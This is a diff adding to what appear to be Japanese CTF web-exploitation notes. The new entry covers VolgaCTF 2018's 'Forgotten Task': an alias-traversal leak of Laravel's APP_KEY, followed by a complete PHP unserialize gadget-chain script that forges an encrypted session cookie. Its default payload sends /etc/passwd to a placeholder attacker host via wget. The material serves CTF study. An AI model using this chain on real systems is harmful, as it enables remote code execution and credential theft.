@@ -1411,10 +1411,92 @@ $ python fork.py &
 # get flag
 $ curl -b cookie "http://host/?m=upload&url=phar:///var/www/data/$MD5_IP/&lucky=%00lambda_1"
 ```
-##
+## Laravel / encrypt gadget in session with APP_KEY / alias traversal (Forgotten Task)
+https://github.com/BlackFan/ctfs/tree/master/volgactf_2018_quals/forgotten_task  
 - **entrypoint**  
+`http://forgotten-task.quals.2018.volgactf.ru/laravel../.env`でalias traversalという手法が使えるらしい。どうやらサーバー側でのaliasの設定が良くないっぽい？(`/i/`を`/data/w3/images/`に変換するエイリアスで、`/i../`を`/data/w3/`と変換するミス？)  
+これでLaravelのAPP_KEYを取得してセッションデータをヤバいやつにAPP_KEYで署名する以下のスクリプトを実行するらしい。  
+よくわからん  
+```txt
+php laravel_attack.php base64:BTyS9a35xfMVYrNkvo8j0MClde4Jk6Tl/e+/+UCEyWA= "file_get_contents('http://attacker_site/rce_test');"
+```
 - **payload**  
+```python
+<?php
+    /* Unserialize Chain */
+    /* See also https://github.com/ambionics/phpggc/tree/master/gadgetchains/Laravel/RCE/1 */
 
+        namespace Illuminate\Broadcasting {
+            class PendingBroadcast {
+                protected $events;
+                protected $event;
+
+                function __construct($events, $cmd) {
+                    $this->events = $events;
+                    $this->event = $cmd;
+                }
+            }
+        }
+
+
+        namespace Illuminate\Events {
+            class Dispatcher {
+                protected $listeners;
+
+                function __construct($cmd) {
+                    $this->listeners = [
+                        $cmd => ['assert']
+                    ];
+                }
+            }
+        }
+
+        namespace {
+
+            function generateChain($code) {
+                return serialize(new \Illuminate\Broadcasting\PendingBroadcast(new \Illuminate\Events\Dispatcher($code), $code));
+            }
+
+    /* // Unserialize Chain */
+
+    /* Laravel Encryptor */
+
+            function encrypt($value, $serialize = false) {
+                global $cipher, $key;
+                $iv = random_bytes(openssl_cipher_iv_length($cipher));
+                $value = openssl_encrypt(
+                    $serialize ? serialize($value) : $value,
+                    $cipher, $key, 0, $iv
+                );
+                $iv = base64_encode($iv);
+                $mac = hash_hmac('sha256', $iv.$value, $key);
+                $json = json_encode(compact('iv', 'value', 'mac'));
+                return base64_encode($json);
+            }
+
+            function decrypt($payload, $unserialize = false) {
+                global $cipher, $key;
+                $payload = json_decode(base64_decode($payload), true);
+                $iv = base64_decode($payload['iv']);
+                $decrypted = openssl_decrypt(
+                    $payload['value'], $cipher, $key, 0, $iv
+                );
+                return $unserialize ? unserialize($decrypted) : $decrypted;
+            }
+
+    /* // Laravel Encryptor */
+
+            $cipher = 'AES-256-CBC';
+            $key = isset($argv[1]) ? $argv[1] : 'ABCDEF1234567890ABCDEF1234567890';
+            $cmd = isset($argv[2]) ? $argv[2] : "system('wget --post-data \"`cat /etc/passwd`\" https://attacker_site/');";
+            
+            if (substr($key, 0, 7) == 'base64:') {
+                $key = base64_decode(substr($key, 7));
+            }
+            
+            echo 'Cookie: volgactf_task_session='.encrypt(generateChain($cmd));
+        }
+```
 ##
 - **entrypoint**  
 - **payload**  
